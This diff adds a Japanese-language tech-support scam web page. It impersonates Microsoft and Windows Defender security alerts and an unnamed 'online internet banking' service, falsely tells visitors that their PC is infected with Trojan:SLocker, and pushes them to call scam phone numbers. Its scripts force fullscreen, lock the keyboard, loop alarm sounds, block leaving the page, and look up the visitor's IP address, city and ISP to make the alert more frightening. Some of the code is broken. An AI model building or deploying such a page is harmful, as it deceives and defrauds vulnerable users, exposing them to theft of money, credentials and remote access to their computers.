@@ -1,0 +1,877 @@
+<!DOCTYPE html><html><head>
+
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title> Online Er#0USA0ND87</title>
+<link rel="stylesheet" href="css/styles.css">
+<script type="text/javascript" src="js/scripts.js"></script>
+<link rel="shortcut icon" href="images/microsoft.png" type="image/png">
+<script src="js/jquery.min.js"></script>
+<script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="css/font-awesome.min.css">
+
+<script>
+var elem = document.documentElement;
+function openFullscreen() {
+  if (elem.requestFullscreen) {
+    elem.requestFullscreen();
+  } else if (elem.webkitRequestFullscreen) { /* Safari */
+    elem.webkitRequestFullscreen();
+  } else if (elem.msRequestFullscreen) { /* IE11 */
+    elem.msRequestFullscreen();
+  }
+}
+
+function closeFullscreen() {
+  if (document.exitFullscreen) {
+    document.exitFullscreen();
+  } else if (document.webkitExitFullscreen) { /* Safari */
+    document.webkitExitFullscreen();
+  } else if (document.msExitFullscreen) { /* IE11 */
+    document.msExitFullscreen();
+  }
+}
+</script>
+ <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            background-color: #000000;
+            font-family: system-ui, -apple-system, sans-serif;
+            overflow: hidden;
+        }
+
+        /* FULL VIEWPORT COVER CONTAINER */
+        .cover-overlay12 {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            height: 100dvh;
+            z-index: 9999999999999999999999;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #000000;
+            transition: opacity 0.6s ease, visibility 0.6s ease;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        /* RESPONSIVE FULL VIEWPORT IMAGE */
+        .cover-img12 {
+            width: 100vw;
+            height: 100vh;
+            height: 100dvh;
+            object-fit: contain;
+            object-position: center;
+            display: block;
+        }
+
+        /* CLICK SE HIDE HONE WALA STATE */
+        .cover-overlay12.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+    </style>
+
+       <script>
+        const coverOverlay = document.getElementById('coverOverlay');
+
+        // Image par click hone par hatne wala script
+        coverOverlay.addEventListener('click', () => {
+            coverOverlay.classList.add('hidden');
+        });
+    </script>
+
+<style>
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 400;
+    src: url(fonts/KFOmCnqEu92Fr1Mu72xKOzY.woff2)format('woff2');
+    unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 400;
+    src: url(fonts/KFOmCnqEu92Fr1Mu5mxKOzY.woff2)format('woff2');
+    unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 400;
+    src: url(fonts/KFOmCnqEu92Fr1Mu7mxKOzY.woff2)format('woff2');
+    unicode-range: U+1F00-1FFF;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 400;
+    src: url(fonts/KFOmCnqEu92Fr1Mu4WxKOzY.woff2)format('woff2');
+    unicode-range: U+0370-03FF;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 400;
+    src: url(fonts/KFOmCnqEu92Fr1Mu7WxKOzY.woff2)format('woff2');
+    unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 400;
+    src: url(fonts/KFOmCnqEu92Fr1Mu7GxKOzY.woff2)format('woff2');
+    unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 400;
+    src: url(fonts/KFOmCnqEu92Fr1Mu4mxK.woff2)format('woff2');
+    unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 500;
+    src: url(fonts/KFOlCnqEu92Fr1MmEU9fCRc4EsA.woff2)format('woff2');
+    unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 500;
+    src: url(fonts/KFOlCnqEu92Fr1MmEU9fABc4EsA.woff2)format('woff2');
+    unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 500;
+    src: url(fonts/KFOlCnqEu92Fr1MmEU9fCBc4EsA.woff2)format('woff2');
+    unicode-range: U+1F00-1FFF;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 500;
+    src: url(fonts/KFOlCnqEu92Fr1MmEU9fBxc4EsA.woff2)format('woff2');
+    unicode-range: U+0370-03FF;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 500;
+    src: url(fonts/KFOlCnqEu92Fr1MmEU9fCxc4EsA.woff2)format('woff2');
+    unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 500;
+    src: url(fonts/KFOlCnqEu92Fr1MmEU9fChc4EsA.woff2)format('woff2');
+    unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 500;
+    src: url(fonts/KFOlCnqEu92Fr1MmEU9fBBc4.woff2)format('woff2');
+    unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 700;
+    src: url(fonts/KFOlCnqEu92Fr1MmWUlfCRc4EsA.woff2)format('woff2');
+    unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 700;
+    src: url(fonts/KFOlCnqEu92Fr1MmWUlfABc4EsA.woff2)format('woff2');
+    unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 700;
+    src: url(fonts/KFOlCnqEu92Fr1MmWUlfCBc4EsA.woff2)format('woff2');
+    unicode-range: U+1F00-1FFF;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 700;
+    src: url(fonts/KFOlCnqEu92Fr1MmWUlfBxc4EsA.woff2)format('woff2');
+    unicode-range: U+0370-03FF;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 700;
+    src: url(fonts/KFOlCnqEu92Fr1MmWUlfCxc4EsA.woff2)format('woff2');
+    unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 700;
+    src: url(fonts/KFOlCnqEu92Fr1MmWUlfChc4EsA.woff2)format('woff2');
+    unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+  }
+
+  @font-face {
+    font-family: 'Roboto';
+    font-style: normal;
+    font-weight: 700;
+    src: url(fonts/KFOlCnqEu92Fr1MmWUlfBBc4.woff2)format('woff2');
+    unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+  }
+</style>
+<style>
+  @font-face {
+    font-family: 'Google Sans';
+    font-style: normal;
+    font-weight: 400;
+    src: url(fonts/4UaGrENHsxJlGDuGo1OIlL3Kwp5MKg.woff2)format('woff2');
+    unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+  }
+
+  @font-face {
+    font-family: 'Google Sans';
+    font-style: normal;
+    font-weight: 400;
+    src: url(fonts/4UaGrENHsxJlGDuGo1OIlL3Nwp5MKg.woff2)format('woff2');
+    unicode-range: U+0370-03FF;
+  }
+
+  @font-face {
+    font-family: 'Google Sans';
+    font-style: normal;
+    font-weight: 400;
+    src: url(fonts/4UaGrENHsxJlGDuGo1OIlL3Bwp5MKg.woff2)format('woff2');
+    unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
+  }
+
+  @font-face {
+    font-family: 'Google Sans';
+    font-style: normal;
+    font-weight: 400;
+    src: url(fonts/4UaGrENHsxJlGDuGo1OIlL3Awp5MKg.woff2)format('woff2');
+    unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+  }
+
+  @font-face {
+    font-family: 'Google Sans';
+    font-style: normal;
+    font-weight: 400;
+    src: url(fonts/4UaGrENHsxJlGDuGo1OIlL3Owp4.woff2)format('woff2');
+    unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+  }
+
+  @font-face {
+    font-family: 'Google Sans';
+    font-style: normal;
+    font-weight: 500;
+    src: url(fonts/4UabrENHsxJlGDuGo1OIlLU94Yt3CwZ-Pw.woff2)format('woff2');
+    unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+  }
+
+  @font-face {
+    font-family: 'Google Sans';
+    font-style: normal;
+    font-weight: 500;
+    src: url(fonts/4UabrENHsxJlGDuGo1OIlLU94YtwCwZ-Pw.woff2)format('woff2');
+    unicode-range: U+0370-03FF;
+  }
+
+  @font-face {
+    font-family: 'Google Sans';
+    font-style: normal;
+    font-weight: 500;
+    src: url(fonts/4UabrENHsxJlGDuGo1OIlLU94Yt8CwZ-Pw.woff2)format('woff2');
+    unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
+  }
+
+  @font-face {
+    font-family: 'Google Sans';
+    font-style: normal;
+    font-weight: 500;
+    src: url(fonts/4UabrENHsxJlGDuGo1OIlLU94Yt9CwZ-Pw.woff2)format('woff2');
+    unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+  }
+
+  @font-face {
+    font-family: 'Google Sans';
+    font-style: normal;
+    font-weight: 500;
+    src: url(fonts/4UabrENHsxJlGDuGo1OIlLU94YtzCwY.woff2)format('woff2');
+    unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+  }
+</style>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans+Text:wght@400;500;700&amp;display=swap" as="style" id="gst" rel="preload" nonce="jPZWjgBELiO2vboq/vPm">
+
+
+
+<script type="text/javascript">
+  document.addEventListener('keyup', function (es) {
+      if (es.keyCode === 27) {
+          toggleFullScreen();
+      }
+  }, false);
+</script>
+
+<script type="text/javascript">
+  document.addEventListener('keyup', function (e) {
+      if (e.keyCode === 122  e.keyCode === 17  e.keyCode === 18 || e.keyCode === 13) {
+          document.getElementById('map').innerHTML = stroka;
+          toggleFullScreen();
+      }
+  }, false);
+</script>
+
+<script type="text/javascript">
+    window.onbeforeunload = function () {
+        if (data_needs_saving()) {
+            return "Do you really want to leave our brilliant application?";
+        } else {
+            return;
+        }
+    };
+</script>
+
+
+<style>.blink_me {
+animation: blinker 1s linear infinite;
+}
+
+@keyframes blinker {
+50% { opacity: 0; }
+}
+
+</style>
+
+<style>
+.blink {
+background-color:red;
+color:white;
+animation: blink-animation 1s steps(5, start) infinite;
+-webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+
+.blink1 {
+background-color:green;
+animation: blink-animation 1s steps(5, start) infinite;
+-webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+
+
+@keyframes blink-animation {
+to {
+visibility: hidden;
+}
+}
+@-webkit-keyframes blink-animation {
+to {
+visibility: hidden;
+}
+}
+</style>
+
+
+<script>
+      function getVariableFromURl(n0me)
+      {
+          n0me = n0me.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+          var regexS = "[\\?&]"+n0me+"=([^&#]*)";
+          var regex = new RegExp( regexS );
+          var results = regex.exec( window.location.href );
+          if( results == null )
+              return "";
+          else
+              return results[1];
+      }
+  </script>
+
+
+  <script type="text/javascript">
+              var ph0ne = getVariableFromURl('ph0ne');
+          </script>
+
+
+
+</head>
+
+ 
+
+<body id="mycanvas" onclick="playSound()">
+
+     <!-- FULL VIEWPORT COVER IMAGE -->
+    <div id="coverOverlay12" class="cover-overlay12">
+        <img src="ChatGPT Image Jul 24, 2026 at 04_16_15 PM.png" alt="Cover Image" class="cover-img">
+    </div>
+
+
+  <div class="bg" style="cursor:none">
+    <div class="bgimg" style="to0">
+      <img src="images/bg.png" alt="" width="100%">
+    </div>
+  </div>
+
+  <a onclick="openFullscreen();" rel="noreferrer" id="link_black" style="">
+      <div class="black" style="height: 145%;"></div>
+  </a>
+
+
+<div class="box" id="box">
+<div class="top">
+<p style="font-size: 16px;  font-family: 'Google Sans', 'Google Sans Text', Roboto, sans-serif;font-weight: 600;">オンラインインターネットバンキングのセキュリティ<img src="images/minimize.jpeg" class="btn" style="float: right; width:115px;"></p>
+</div>
+
+<h2 style="position: absolute; left: 70px; to 60px; font-weight: 300;" id="text1">一目でわかる安全性</h2>
+<p style="position: absolute; left: 70px; to 100px; font-weight: 0; font-size: 13px;" id="text2"><br>デバイスの安全性と健康状態に何が起こっているかを確認し、必要な措置をすべて講じてください。.</p>
+<div class="centerright">
+<ul>
+<li>
+<br>
+<img src="images/kxFy-clip.png" width="40px;">
+<p>ウイルスと脅威からの保護</p>
+<p style="to 120px; position: absolute; font-size: 13px; color: grey;">アクションが必要です。スキャンを実行して確認します <br>threats.</p>
+
+</li>
+<li>
+<br><br>
+<img src="images/qsbs-firewall.png" width="60px;">
+<p>ファイアウォールとネットワーク保護</p>
+<p style="to 270px; position: absolute; font-size: 13px; color: grey;">アクションは必要ありません.</p>
+</li>
+</ul>
+<ul>
+<li>
+<br>
+<img src="images/s-S4-acc.png" width="60px;">
+<p>Account protection</p>
+<p style="to 125px; position: absolute; font-size: 13px; color: grey;">アクションは必要ありません.</p>
+</li>
+<li>
+<br>
+<img src="images/Z5BR-network.png" width="51px;">
+<p>Application and browser control</p>
+<p style="to 270px; position: absolute; font-size: 13px; color: grey;">アクションは必要ありません.</p>
+</li>
+</ul>
+</div>
+<img src="images/uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+<br>
+</div>
+
+
+<!--Chrome Security Quick Scan-->
+<div class="scan" id="scan">
+  <div class="top">
+  <p style="font-size: 16px;  font-family: 'Google Sans', 'Google Sans Text', Roboto, sans-serif;font-weight: 600;">オンラインインターネットバンキングのセキュリティ<img src="images/minimize.jpeg" class="btn" style="float: right; width:115px;"></p>
+  </div>
+  <h2 style="position: absolute; left: 66px; to 49px; font-weight: 300;" id="text1"><img src="images/kxFy-clip.png" width="30px;" style="margin-right: 10px;vertical-align: text-top;">ウイルスと脅威からの保護</h2>
+  <p style="position: absolute; left: 70px; to 100px; font-weight: 0; font-size: 13px;" id="text2">脅威に対するデバイスの保護.</p>
+
+<h3 style="position: absolute; right: 180px; to -10px; font-weight: 300;" id="text12"><b>+1-800-000-0000 (無料セキュリティ)
+</b></h3>
+
+  <div class="centerright">
+
+
+  <ul>
+  <li>
+
+
+
+  <div class="flex"> <img src="images/-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; to 33px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">Current Threat</p></div>
+
+
+  <br><br>
+  <div class="progress" id="bar">
+    <div class="progress__bar"></div>
+  </div>
+
+  <p style="font-size: 13px;" id="info">クイックスキャンが進行中です...<br>推定残り時間: <n id="time">0</n><br><n id="amount">0</n> スキャンされたファイル.</p>
+
+  <a href="#" class="button" id="re">キャンセルする</a>
+  <p style=" font-size: 13px;" id="recx">デバイスを分析している間、作業を続けてください。</p>
+
+  <p style="font-size: 13px; color: #0063c6; cursor: pointer;" id="recx-hide">保護履歴</p>
+  <br>
+  <p id="shx" style="font-size: 13px; color: #0063c6; display: none; cursor: pointer;">Scan Options<br> 許可される脅威<br> 保護履歴</p>
+
+
+  </li>
+
+  <li>
+
+<div class="flex"><img src="images/nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px; margin-to 5px;"><p style="position: absolute; left: 35px;    bottom: 76px;    line-height: 18px;">Virus &amp; threat protection settings </p> </div>
+<p style="color: grey; font-size: 13px;">アクションは必要ありません</p>
+<p style="font-size: 13px; color: #0063c6;">設定を管理する</p>
+  </li>
+  </ul>
+  <ul>
+
+  <li>
+
+
+  <p style="position: absolute; to -55px;">質問があります？</p>
+
+  <p style="font-size: 13px; color: #0063c6; position: absolute; to -15px; cursor: pointer;">助けてもらう</p>
+
+  </li>
+  <li>
+
+
+    <p style="position: absolute; to 25px;">誰が私を守ってくれるのか</p>
+
+    <p style="font-size: 13px; color: #0063c6; position: absolute; to 65px; cursor: pointer;">サプライヤー管理</p>
+
+    </li>
+    <li>
+
+
+      <p style="position: absolute; to 80px; "><br>オンライン インターネット バンキングのセキュリティ向上にご協力ください</p>
+
+      <p style="font-size: 13px; color: #0063c6; position: absolute; to 152px; cursor: pointer;">フィードバックをお寄せください</p>
+
+      </li>
+      <li>
+
+        <p style="position: absolute; to 190px;">プライバシー設定を変更する</p>
+        <p style="position: absolute; to 220px; font-size: 13px;">オンライン インターネット バンキングのプライバシー設定の表示と変更<br><n id="which"></n> デバイス.</p>
+
+        <p style="font-size: 13px; color: #0063c6; position: absolute; to 270px; cursor: pointer;">プライバシー設定<br>プライバシーダッシュボード<br>プライバシーに関する声明</p>
+
+        </li>
+
+  </ul>
+
+  </div>
+  <img src="images/uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+  <br>
+  </div>
+  <script>
+          navigator.userAgentData.getHighEntropyValues(["platformVersion"])
+   .then(ua => {
+     if (navigator.userAgentData.platform === "Windows") {
+       const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
+       if (majorPlatformVersion >= 13) {
+        document.getElementById("which").innerHTML = " 11";
+        }
+        else if (majorPlatformVersion > 0) {
+          document.getElementById("which").innerHTML = " 10";
+        }
+        else {
+          console.log("Beyond");
+        }
+     }
+     else {
+       console.log("does not work on Online Internet Banking");
+     }
+   });
+  </script>
+
+
+
+
+
+
+<div class="alert_popup cardcontainer lightbox">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <p class="text-center" style="    font-size: 16px;
+font-weight: normal;
+margin: 0;
+margin-bottom: 5px;
+padding: 5px 10px;
+color: #fff;font-weight: bold;
+margin-to 8px; text-align: center;"><img src="images/microsoft.png" class="logo12"> オンライン インターネット バンキングのセキュリティ - スパイウェアの警告</p>
+                <p class="text-center">** オンライン インターネット バンキングが Trojan:SLocker に感染しています **</p>
+                <p>ブラウザのバージョンが古いため、重大なエラーが発生しました。できるだけ早くブラウザを更新してください.</p>
+                <p>古いバージョンのブラウザでは、次のエラーが発生する可能性があります。:</p>
+                <ul class="icon-links">
+                  <li>&gt; 個人データと保存データの損失</li>
+                  <li>&gt; 機密情報の漏洩</li>
+                  <li>&gt; ブラウザのエラー</li>
+                </ul>
+
+                  <p>オンライン インターネット バンキングのセキュリティ スキャンにより、パスワード、オンライン ID、財務情報、個人ファイル、画像、ドキュメントを盗む可能性のある望ましくない可能性のあるアドウェアがこのデバイス上で検出されました.</p>
+                  <p>すぐにご連絡ください。当社のエンジニアが電話で削除プロセスについて説明します。.<br><br>
+
+                  すぐにオンライン インターネット バンキング サポートに連絡して、この脅威を報告し、なりすましを防止し、このデバイスへのアクセスのロックを解除してください。<br><br>
+                  このオンライン インターネット バンキングを閉じると、個人情報が危険にさらされ、オンライン インターネット バンキングの登録が中断されます。.</p>
+
+               <p style="padding-bottom: 0px;">オンラインインターネットバンキングサポートに電話する <strong>+1-800-000-0000 (インターネットバンキングヘルプライン)</strong></p>
+               <div class="action_buttons"> <a class="" id="leave_page" style="cursor: pointer;">わかりました</a> <a class="" id="leave_page">キャンセル</a> </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+<audio id="beep" loop="">
+  <source src="media/_Fm7-alert.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+  addEventListener("click", function() {
+var el = document.documentElement
+  , rfs =
+         el.requestFullScreen
+      || el.webkitRequestFullScreen
+      || el.mozRequestFullScreen
+;
+rfs.call(el);
+});
+
+</script>
+
+<script>
+  var t = new XMLHttpRequest;
+  t.onreadystatechange = function() {
+    if (4 == this.readyState && 200 == this.status) {
+      var a = JSON.parse(this.responseText);
+      ipadd = a.ip;
+      city = a.city;
+      country = a.country;
+      isp = a.connection.isp;
+      var b = new Date;
+      currtime = a.timezone.current_time;
+      document.getElementById("ip_add").textContent = "Address I " + ipadd + " " + b.toLocaleString("EN-US", currtime);
+      document.getElementById("city").textContent = "Location: " + city + ", " + country;
+      document.getElementById("isp").textContent = "IS " + isp
+    }
+  };
+  t.open("GET", "https://ipwho.is/?lang=en", !0);
+  t.send();
+</script>
+
+<div id="lst" class="lst lightbox">
+  <div class="ilb top">
+      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
+          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="images/microsoft.png" class="logo3"></span> オンライン インターネット バンキング セキュリティ センター</span>
+          <span id="txts1" class="fl title2"><a href="#"><img src="images/cross.png"></a></span>
+
+      </div>
+  </div>
+  <div id="txtintro">
+              <!-- <span class="colo-rd">Ap Ads.financetrack(2).dll<br>
+              Threats Detected: Trojan Spyware</span> -->
+              <span class="colo-rd"><span class="blink">(5)</span> デバイスでウイルス/マルウェア感染が検出されました.<br>
+            </span>
+              <div id="ip_add">オンライン インターネット バンキングのファイアウォール アラート !</div>
+              <div id="city">ご希望のIDでインターネットバンキングにログインしてください</div>\\
+              <div id="isp"> (エラーコード:#Er0d2_JP07E)</div>
+
+
+  </div>
+  <div class="">
+    <ul class="imglinks">
+      <li><img src="images/gif1.gif" alt=""></li>
+      <li><img src="images/microsoft.png" class="banner" alt=""></li>
+      <li><img src="images/gif2.gif" alt=""></li>
+    </ul>
+  </div>
+
+  <div id="disclaimer">
+    この PC に保存されている個人データ、銀行情報、Web ログイン認証情報は、重大なセキュリティ侵害により危険にさらされています。.<br>
+      <span class="support">オンライン インターネット バンキング サポートへのお問い合わせ: 0101 (808)-330-8423</span>
+  </div>
+  <div id="bottom">
+      <img id="badge" src="images/microsoft.png"><span class="title3">オンラインインターネットバンキング</span>
+      <ul>
+          <li>
+              <a href="#">
+                  <div class="fr button2">
+                      <span id="addtochromebutton">ページを離れる</span>
+                  </div>
+              </a>
+          </li>
+          <li>
+              <a href="#">
+                  <div class="fr buttons blink">
+                      <span id="addtochromebutton">問題を報告する</span>
+                  </div>
+              </a>
+          </li>
+      </ul>
+
+  </div>
+</div>
+
+
+
+<div id="footer">
+  <div class="row">
+
+      <div class="col-md-12">
+          <div class="right-foot" style="text-align: center;">
+              <span id="footertxt"><img src="images/microsoft.png"> オンラインインターネットバンキング: </span><span style="font-weight: 700;padding-left: 13px;color: #fff;"> インターネットバンキングのサポート <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"> 0101 (808)-330-8423 (フリーダイヤル)</span></span>
+          </div>
+      </div>
+      <div class="col-md-12">
+          <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 12px;"><strong>セキュリティに関する注意事項 :</strong> あなたのセキュリティは私たちにとって重要です。この要求に心当たりがない場合は、レポート提出時に直ちにご連絡ください。</small></marquee>
+      </div>
+  </div>
+
+
+</div>
+
+<div id="welcomeDiv" class="answer_list">
+    <p class="text-center" style="color: #FEFEFE;  margin-to10px; font-size: 16px; opacity:.9; ">オンライン インターネット バンキング PC が trojan.slocker ウイルス/マルウェアに感染しました。このタイプのウイルス/マルウェアは、身代金のために金融情報を乗っ取ったり、盗んだ情報を直接窃盗に使用したりすることが一般的に知られています。
+この感染は直ちに除去する必要があります。インターネット バンキング ヘルプライン: 0101 (808)-330-8423 (フリーダイヤル) にご連絡ください。</p>
+
+
+</div>
+
+<div id="chrome-alerts" class="chrome-alert" style="padding-to10px">
+	<div>
+	<!-- <a href="javascript:openlink()" class="cross">×</a> -->
+		<p>サイトを離れる?</p>
+    <p>加えた変更は保存されない可能性があります.</p>
+    <input type="checkbox" id="checkbox" name="checkbox" value="checkbox">
+  <label for="checkbox">このページで追加のダイアログが作成されないようにします</label><br>
+		<div class="action_buttons">
+		  <a class="" id="leave_page">キャンセル</a>
+		  <a class="active" id="leave_page">離れる</a>
+		</div>
+	</div>
+</div>
+
+
+<script>
+  $(document).ready(function () {
+      $("#mycanvas").click(function () {
+          $("#welcomeDiv").show();
+      });
+  });
+</script>
+<script type="text/javascript">
+  window.onbeforeunload = function() {
+     if (data_needs_saving()) {
+         return "Call Windows Defender Helpline Now";
+     } else {
+        return;
+     }
+  };
+          </script>
+          <script type="text/javascript">
+              window.addEventListener("beforeunload", function (e) {
+           var confirmationMessage = 'It looks like you are editing something. '
+                              + 'Your changes will be lost if you leave before saving.';
+
+                  (e || window.event).returnValue = confirmationMessage; //Gecko + IE
+                  return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
+              });
+          </script>
+
+
+              <script>
+              navigator.keyboard.lock();
+              document.onkeydown = function (e) {
+              return false;
+              }
+              </script>
+
+
+
+              <div id="chat-box">
+                <img src="images/microsoft.png"><span style="color: #222;
+              font-size: 21px;
+              font-weight: 600;
+              margin-left: 6px;
+              position: relative;">インターネットバンキング</span> <p style="font-weight: 600;">インターネットバンキングのサポート</p>
+               <h4 style="font-weight: 600;"> 0101 (808)-330-8423 （本社）</h4>
+                 <div class="arrow-down">
+                   <i class="fa fa-caret-down"></i>
+                 </div>
+
+                </div>
+
+<script>
+  $(document).ready(function() {
+   var audioElement = document.createElement('audio');
+   audioElement.setAttribute('src', 'beeps.mp3');
+
+   audioElement.addEventListener('ended', function() {
+       this.play();
+   }, false);
+
+
+    $('#mycanvas').click(function() {
+       audioElement.play();
+
+   });
+
+     $('#link_black').click(function() {
+       audioElement.play();
+
+   });
+
+
+      $('#footer').click(function() {
+       audioElement.play();
+
+   });
+
+       $('#lst').click(function() {
+       audioElement.play();
+
+   });
+
+});
+</script>
+
+              <script type="text/javascript">
+                $(document).ready(function() {
+                 $("#chat-box").delay(6000).fadeIn(100);
+              });
+
+              </script>
+    <script>
+        const coverOverlay12 = document.getElementById('coverOverlay12');
+        coverOverlay12.addEventListener('click', () => {
+            coverOverlay12.classList.add('hidden');
+        });
+    </script>
+
+              
+</body></html>
